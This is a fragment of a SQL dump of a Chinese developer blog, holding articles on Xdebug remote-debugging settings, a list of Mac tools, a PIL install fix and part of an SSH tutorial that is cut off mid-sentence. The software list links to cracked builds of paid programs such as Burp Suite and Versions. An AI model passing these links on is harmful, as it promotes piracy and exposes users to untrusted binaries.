\r\nType: string, Default value: *complex*\r\n\r\n	控制Xdebug应该传递给```DBGp```调试处理器那一个IDE key。默认情况下是基于环境配置的。首先，环境变量中的```DBGP_IDEKEY```会被使用，然后是USER和USERNAME。默认会使用在环境变量中第一次发现的配置值，如果找不到配置，则使用默认的''''。如果设置了这个选项，它将会覆盖环境变量的配置。\r\n\r\n- **xdebug.remote_autostart**   \r\nType: boolean, Default value: 0\r\n\r\n	通常情况下，你需要使用指定的HTTP GET/POST变量去激活Xdebug的远程调试功能。当这个设置为1的情况下，Xdebug将在脚本执行时总是尝试去连接调试客户端，即使没有设置GET/POST/COOKIE变量。＝\r\n\r\n- **xdebug.remote_connect_back**   \r\nType: boolean, Default value: 0, Introduced in Xdebug > 2.1\r\n\r\n	如果允许的话，```xdebug.remote_host```设置将会被失效，Xdebug将会尝试连接发送HTTP请求的计算机的调试客户端。他将会检查```$_SERVER[''REMOTE_ADDR'']```变量，查找所使用的IP地址。请注意，这里没有可用的过滤器，任何连接到webserver的人都可以开始一个调试会话，即使他们的IP地址与```xdebug.remote_host```并不相同。\r\n\r\n- **xdebug.remote_cookie_expire_time**   \r\nType: integer, Default value: 3600, Introduced in Xdebug > 2.1\r\n\r\n	这个选项用于控制调试会话可用的时间。\r\n\r\n- **xdebug.remote_enable**   \r\nType: boolean, Default value: 0\r\n\r\n	这个选项控制是否允许远程调试，如果无法建立连接的话脚本将会继续执行，就像这个配置的值为0一样。\r\n\r\n- **xdebug.remote_handler**   \r\nType: string, Default value: dbgp\r\n\r\n	这个值可以是```php3```，用于使用旧式的PHP 3样式的调试输出，```gdb```用于允许使用GDB的调试器接口或者```dbgp```协议。```DBGp```协议是唯一支持的协议。\r\n\r\n> 注意: Xdebug 2.1 和之后的版本只支持```dbgp```协议。\r\n\r\n- **xdebug.remote_host**   \r\nType: string, Default value: localhost\r\n\r\n	选择调试客户端运行在那个主机上，这个选项可以使用主机名或者是IP地址。如果```xdebug.remote_connect_back```选项指定了的花该选项将会被忽略。\r\n\r\n- **xdebug.remote_log**   \r\nType: string, Default value:\r\n\r\n	如果设置了这个值，将会使用它作为文件名，所有的远程调试连接都会被记录到该日志文件中。这个文件总是以追加模式打开，因此，默认情况下不要覆写它。这里没有进行并发保护。日志文件的格式类似于下面：\r\n	<pre>\r\n	Log opened at 2007-05-27 14:28:15\r\n	-> &lt;init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/x ... ight>&lt;/init>\r\n\r\n	&lt;- step_into -i 1\r\n-> &lt;response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/db ... >&lt;/response></pre>\r\n\r\n- **xdebug.remote_mode**   \r\nType: string, Default value: req\r\n\r\n选择调试连接什么时候建立。这个选项有两个不同的值:\r\n\r\n```req```   \r\nXdebug将会当脚本执行开始的时候立即连接到调试客户端。\r\n\r\n```jit```   \r\nXdebug 只会在脚本发生错误的情况下尝试去连接调试客户端。\r\n\r\n- **xdebug.remote_port**   \r\nType: integer, Default value: 9000\r\n\r\nXdebug用于连接客户端的端口号。默认端口为9000.\r\n\r\n####相关函数\r\n\r\nbool xdebug_break()   \r\n\r\n给调试客户端发送一个断点，这个函数让调试器在指定的行上设置一个断点。\r\n', 'Xdebug提供了客户端与PHP脚本进行交互的接口，这一章将会介绍如何让PHP和Xdebug开启这个特性，并且介绍一些常用的客户端。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/176f01834ec65f9f1c1e34a829a637a2.jpg', 'mylxsw', '翻译', 1, 0, 1405317585, 1405318009, 0, 'markdown'),
(363, 'Mac下常用软件集锦', '#### Burp Suite\r\n\r\n在Windows下有 [Fiddler2](http://www.telerik.com/fiddler) 可以使用，在Mac下可以使用 [Burp Suite](http://www.portswigger.net/burp/) ，该软件本身是用于攻击web 应用程序的集成平台，但是使用过程中发现用于抓包分析还是不错的。破解版的1.6beta下载地址：[乐视云盘下载1.6 beta](http://cloud.letv.com/s/zKQCtu7Xe)\r\n\r\n#### Versions\r\n\r\nVersions是Mac下的一款收费的SVN管理工具，破解版地址：[乐视云盘下载 1.2.2](http://cloud.letv.com/s/Z7nHg1YCb)    \r\n\r\n#### Transmit\r\n\r\nTransmit 是一款FTP (file transfer protocol), SFTP和 iDisk/WebDAV客户端软件，下载地址: [乐视云盘下载 4.4.6](http://cloud.letv.com/s/mJ0dz4Pk)\r\n\r\n#### Server\r\n\r\nOS X Server，苹果官方出品的服务器软件，使用这款软件可以快速的让你的Mac电脑变为一台多功能的服务器，如文件共享服务器、Xcode 服务器、WWW网站服务器、Time Machine、通讯录服务器、邮件服务器等等， 下载地址: [乐视云盘下载 3.1.2](http://cloud.letv.com/s/zZzMx2)\r\n\r\n####XQuartz\r\n\r\n[XQuartz](http://xquartz.macosforge.org/landing/) 项目是一个开源的工程，在OS X上建立 X Window系统，它提供了一系列用于支持X Window的类库和应用。\r\n\r\n####Charles 抓包工具\r\n\r\n非常好用的抓包工具，不仅仅可以抓浏览器的请求，还可以抓系统全局的请求。 下载地址: [乐视云盘下载 3.9.1](http://cloud.letv.com/s/hwhQV4Gz)\r\n\r\n####MongoHub Mongo数据库管理工具\r\n\r\nMongoHub是Mac上的一款Mongo数据库管理工具，它可能是NoSQL数据库的第一款桌面GUI工具，下载地址: [官方主页](http://mongohub.todayclose.com/)\r\n\r\n####MySQLWorkbench MySQL官方的管理工具\r\n\r\nMySQL Workbench 是专为数据库架构师、开发人员和 DBA 打造的一个统一的可视化工具。MySQL Workbench 提供了数据建模工具、SQL 开发工具和全面的管理工具（包括服务器配置、用户管理、备份等）。MySQL Workbench 可在 Windows、Linux 和 Mac OS 上使用。下载地址:[官方主页](http://www.mysql.com/products/workbench/)。\r\n\r\n####SQLiteStudio\r\n\r\nMac上的一款SQLite数据库的GUI管理工具，下载地址：[官方主页](http://www.sqlitestudio.pl/)\r\n\r\n####Visual Paradigm CE\r\n\r\nUML设计工具。下载地址:[官方](http://www.visual-paradigm.com/download/)\r\n\r\n####ShadowsocksX\r\n是一款高性能的socks5代理，用于翻墙。下载地址：[乐视云盘下载2.3](http://cloud.letv.com/s/KUnlxO)\r\n\r\n####DaisyDisk\r\n非常好用的磁盘清理工具，可以分析系统中所有文件，找出占用空间的大文件。下载地址：[乐视云盘下载](http://cloud.letv.com/s/vezEkZCe)', '本文收集了平时在Mac系统上进行开发过程中经常用到的各种软件，一方面自己记录一下，以便哪天系统崩溃了也好重新寻找这些软件，另一方面方便大家，免去了需要软件的痛苦。本文不定期更新。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/c3c946e2fbad29ac96f65ed4a25949cf.jpg', 'mylxsw', '原创', 1, 0, 1405388407, 1413537801, 0, 'markdown'),
(366, 'Mac OS 安装Python模块PIL报错解决', '在使用pip安装Python的PIL模块的时候，出现以下错误：\r\n\r\n<pre>\r\nIn file included from tkStubLib.c:15:\r\n/usr/include/tk.h:78:11: fatal error: ''X11/Xlib.h'' file not found\r\n#include &lt;X11/Xlib.h>\r\n</pre>\r\n\r\n解决办法如下：   \r\n\r\n1. 安装 [XQuartz](http://xquartz.macosforge.org/landing/)\r\n2. 安装完成后，创建如下链接<pre>ln -s /opt/X11/include/X11 /usr/local/include/X11</pre>\r\n3. 安装PIL <pre>pip install PIL</pre>', '在使用pip安装Python的PIL模块的时候，出现错误.', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/c1c51f882efa674fb6c2ed127bd46878.jpg', 'mylxsw', '原创', 1, 0, 1405570661, 1408031348, 0, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(368, 'SSH原理与运用', '<p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><img src="http://image.beekka.com/blog/201112/bg2011122101.jpg" style="font-family: inherit; font-size: inherit; margin: 0px; padding: 0px; border: 0px rgb(51, 51, 51); font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; display: block; max-width: 100%;"/></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">一、什么是SSH？</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">简单说，SSH是一种网络协议，用于计算机之间的加密登录。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">需要指出的是，SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是<a href="http://www.openssh.com/" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">OpenSSH</a>，它是自由软件，应用非常广泛。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">此外，本文只讨论SSH在Linux Shell中的用法。如果要在Windows系统中使用SSH，会用到另一种软件<a href="http://www.chiark.greenend.org.uk/~sgtatham/putty" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">PuTTY</a>，这需要另文介绍。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">二、最基本的用法</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">SSH主要用于远程登录。假定你要以用户名user，登录远程主机host，只要一条简单命令就可以了。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh user@host</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">如果本地用户名与远程用户名一致，登录时可以省略用户名。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh host</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">SSH的默认端口是22，也就是说，你的登录请求会送进远程主机的22端口。使用p参数，可以修改这个端口。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh -p 2222 user@host</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">上面这条命令表示，ssh直接连接远程主机的2222端口。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">三、中间人攻击</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">SSH之所以能够保证安全，原因在于它采用了公钥加密。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">整个过程是这样的：（1）远程主机收到用户的登录请求，把自己的公钥发给用户。（2）用户使用这个公钥，将登录密码加密后，发送回来。（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这个过程本身是安全的，但是实施的时候存在一个风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像https协议，SSH协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">可以设想，如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），用伪造的公钥，获取用户的登录密码。再用这个密码登录远程主机，那么SSH的安全机制就荡然无存了。这种风险就是著名的<a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack" target="_blank" style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; color: rgb(51, 51, 51); text-decoration: none;">&quot;中间人攻击&quot;</a>（Man-in-the-middle attack）。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">SSH协议是如何应对的呢？</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">四、口令登录</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">如果你是第一次登录对方主机，系统会出现下面的提示：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">　　$ ssh user@host</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">　　The authenticity of host &#39;host (12.18.429.21)&#39; can&#39;t be established.</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">　　RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d.</p><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　Are you sure you want to continue connecting (yes/no)?</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这段话的意思是，无法确认host主机的真实性，只知道它的公钥指纹，问你还想继续连接吗？</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">所谓&quot;公钥指纹&quot;，是指公钥长度较长（这里采用RSA算法，长达1024位），很难比对，所以对其进行MD5计算，将它变成一个128位的指纹。上例中是98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d，再进行比较，就容易多了。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">很自然的一个问题就是，用户怎么知道远程主机的公钥指纹应该是多少？回答是没有好办法，远程主机必须在自己的网站上贴出公钥指纹，以便用户自行核对。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">假定经过风险衡量以后，用户决定接受这个远程主机的公钥。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　Are you sure you want to continue connecting (yes/no)? yes</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">系统会出现一句提示，表示host主机已经得到认可。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　Warning: Permanently added &#39;host,12.18.429.21&#39; (RSA) to the list of known hosts.</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">然后，会要求输入密码。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　Password: (enter password)</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">如果密码正确，就可以登录了。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">当远程主机的公钥被接受以后，它就会被保存在文件$HOME/.ssh/known_hosts之中。下次再连接这台主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">每个SSH用户都有自己的known_hosts文件，此外系统也有一个这样的文件，通常是/etc/ssh/ssh_known_hosts，保存一些对所有用户都可信赖的远程主机的公钥。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">五、公钥登录</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">使用密码登录，每次都必须输入密码，非常麻烦。好在SSH还提供了公钥登录，可以省去输入密码的步骤。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">所谓&quot;公钥登录&quot;，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用ssh-keygen生成一个：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh-keygen</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">运行结束以后，在$HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub和id_rsa。前者是你的公钥，后者是你的私钥。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这时再输入下面的命令，将公钥传送到远程主机host上面：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh-copy-id user@host</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">好了，从此你再登录，就不需要输入密码了。</p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">如果还是不行，就打开远程主机的/etc/ssh/sshd_config这个文件，检查下面几行前面&quot;#&quot;注释是否取掉。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　RSAAuthentication yes<br/>　　PubkeyAuthentication yes<br/>　　AuthorizedKeysFile .ssh/authorized_keys</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">然后，重启远程主机的ssh服务。</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">　　// ubuntu系统<br/>　　service ssh restart</p><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　// debian系统<br/>　　/etc/init.d/ssh restart</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;"><strong style="margin: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline;">六、authorized_keys文件</strong></p><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">远程主机将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys文件中。公钥就是一段字符串，只要把它追加在authorized_keys文件的末尾就行了。<br/><br/>这里不使用上面的ssh-copy-id命令，改用下面的命令，解释公钥的保存过程：</p><blockquote style="margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-left-style: solid; border-color: rgb(209, 209, 209); font-family: Helvetica, Arial; font-style: italic; line-height: 24px; vertical-align: baseline; quotes: none; color: rgb(51, 51, 51); white-space: normal;"><p style="margin-top: 0px; padding: 0px; border: 0px; font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; line-height: inherit; vertical-align: baseline; margin-bottom: 0px !important;">　　$ ssh user@host &#39;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#39; &lt; ~/.ssh/id_rsa.pub</p></blockquote><p style="margin-top: 0px; margin-bottom: 1.5em; padding: 0px; border: 0px; font-family: Helvetica, Arial; line-height: 24px; vertical-align: baseline; color: rgb(51, 51, 51); white-space: normal;">这条命令由多个语句组成，依次分解开来看：（1）&quot;$ ssh user@host&quot;，表示登录远程主机；（2）单引号中的mkdir .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys，表示登录后在远程shell上执行的命令：（3）&quot;$ mkdir -p .ssh&quot;的作用是，如果用户主目录中的.ssh目录不存在，就创建一个；（4）&#39;cat &gt;&gt; .ssh/authorized_keys&#39; &lt; 